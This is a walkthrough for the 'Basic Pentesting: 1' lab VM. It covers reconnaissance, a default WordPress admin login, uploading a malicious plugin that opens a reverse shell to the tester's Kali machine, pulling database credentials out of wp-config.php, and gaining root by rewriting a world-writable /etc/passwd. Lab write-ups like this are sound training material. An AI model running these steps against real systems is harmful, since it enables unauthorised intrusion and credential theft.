# Basic Pentesting: 1
By Josiah Pierce  

* After the VM has been booted up, we are greeted with a login page that request for the password of user marlinspike.
* The IP address of the VM can be found by clicking the icon with 2 arrows pointing up and down respectively on the top right-hand corner of the VM. No nmap scans are thus needed.
* The IPv4 address of the VM is 192.168.110.135.
* From our Kali VM, execute `nmap -sS 192.168.110.135`.
* There are 3 ports that are open: 21 (ftp), 22 (ssh) and 80 (http). These results are loaded instantly after the command is executed - it is likely that the scan result was cached(?).
* We visit 192.168.110.135 and find a web server running. The page says "It works!".
* Note: Viewing the page source reveals no additional information.
* Note: /admin, /login.php, /robots.txt are invalid pages as well.
* Though the page also said that "no content has been added yet", we cannot necessarily trust it: run `dirbuster`, which tries to find hidden files and directories using a user-supplied wordlist.
* Put 192.168.110.135 into the `Target URL` of dirbuster. We will use a wordlist that is provided by dirbuster, which can be found in /usr/share/dirbuster/wordlists. We will use `directory-list-lowercase-2.3-small.txt` for a start. We will also use `30 threads`.
* While waiting for dirbuster to do its job, we will look at other areas, such as verifying that it is indeed the ssh service which is running at port 22. Since there is a response that requests for the password, we can confirm that it is indeed the case.
* Heading back to dirbuster, we find that there is a directory called `secret` that contains `wp-content`, `wp-includes`, etc.
* With 192.168.110.135/secret, we expect a WordPress page to load, which happens (page is titled "My secret blog"). Note: the page loads rather slowly and the page contents are not loaded properly, i.e. positioning of the texts, icons are off, as if there was no CSS.
* Placing our mouse over some of the links, we find that the hyperlink domain is actually `vtcsec`. A very likely reason that the page was loading slowly is that the browser was trying to resolve vtcsec, but was unable to do so eventually.
* Next, open our Hosts file in Kali: `sudo nano /etc/hosts` and add in 2 entries: `192.168.110.135 vtcsec` and `192.168.110.135 vtcsec.com`. Save the file once done. What this means is that the IP address of vtcsec is determined by us to be 192.168.110.135, and any  accesses to vtcsec will access 192.168.110.135, instead of trying to find out its IP address from a DNS server.
* Note: The vtcsec.com mapping is added just in case there might be a case where there is a `.com` domain extension for one of the hyperlinks in the WordPress page, though we have yet to see one so far.
* Reload `192.168.110.135/secret` and volia, we see that the page has been properly loaded. This is because the CSS was trying to pull from a domain that did not exist until we added the entries to the Hosts file.
* There is no interesting content on the site's post, so we head to the Login page of the WordPress site and attempt to login using the username `admin` and a random password. Using a random password allows us to check if an account with the username admin exists. The error message from an invalid login, that "the password you entered for the username admin is incorrect" confirms so. This is a form of information leakage in my opinion on WordPress' part.
* Next, we attempt a quick guess with the password `admin` for the admin account, and access is granted. No kind of bruteforcing is required here.
* Head to the `Plugins` page and install `malicious-wordpress-plugin` by `wetw0rk` [(GitHub link)](https://github.com/wetw0rk/malicious-wordpress-plugin). Once it is installed on the WordPress site, a reverse shell is granted.
* Before beginning the installation of the plugin, we will first start up our listener by opening the Git repository from our terminal, and execute `python wordpwn.py 192.168.110.132 4000`. The IP address in the parameter is that of the Kali machine.
* The payload is then generated in a .zip file. Once the reverse TCP handler (listener) is started on the Kali terminal, we can upload the payload as a plugin (`GotEm`) to the WordPress site, and activate it.
* We will next head to the plugins editor, select the GotEm plugin to find out the path to the files which are within the plugin, which are `malicious/QwertyRocks.php` and `malicious/wetw0rk_maybe.php`. There are only commented codes in the former, and in the latter, we find that there is a whole long string within a base64_decode and eval functions.
* Next, we head to `vtcsec/secret/wp-contet/plugins/malicious/wetw0rk_maybe.php`.
* Heading back to our Kali terminal, we see that a session has been opened, and enter `shell`. Executing `whoami`, we see that we are www-data. We have now successfully logged into the victim VM.
* From the reverse shell which we have gotten, we can go up a few levels of directory to the one that contains a number of `wp-` PHP files, and specifically we want to download the wp-config.php to the root folder (i.e. back to our Kali machine): `download wp-config.php /root`.
* Open up the config file from our Kali machine with a text editor, and we find that we have the MySQL database username `root` and password `arootmysqlpass`.
* Side-note: We can probably do a **privilege escalation** from here after logging in to the database, but this is not the focus here at this moment.
* Next, we will use `unix-privesc-check` from `pentestmonkey` [(GitHub link)](https://github.com/pentestmonkey/unix-privesc-check) on the victim VM. This tool is a "shell script to check for simple privilege escalation vectors on Unix systems".
* From our reverse shell, cd to `/var/www/html`, which hosts the secret page. We will now upload the tool to the victim VM: `upload /root/unix-privesc-check`.
* Give executable permissions to the script via chmod, and then `./unix-privesc-check standard > output.txt`. Wait for awhile for our results to be redirected to the output text file. Next, download output.txt to /root.
* Search for the string "WARNING" output.txt and we see that one of the findings is that `/etc/passwd` can be written by anyone. Download the /etc/passwd file to /root.
* The first line of /etc/passwd is `root:x:0:0:root:/root:/bin/bash`. We see an `x`, which is a holding place for root's "encrypted password". Traditionally, this field actually stored the user's encrypted password. Modern Unix systems store encrypted passwords in a separate file (the shadow password file) that can be accessed only by privileged users.
* However, we can overwrite the `x` with a hash of a known password.
* Run `openssl passwd -1`, and enter a simple password (e.g. `pass`). `openssl passwd` computes the hash of our password typed at run-time in this case. Replace the `x` with our hash value, save the file, and upload the file back to the victim VM.
* Note: `-1` means the use of MD5 based BSD password algorithm 1.
* Execute `su root -l`, but there is an error stating that su must be run from a terminal. Execute `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn a proper shell.
* Note: `-l` means `--login`, i.e. to start the shell as a login shell with an environment similar to a real login.
* Enter our password created above (e.g. `pass`), and we have got root access!
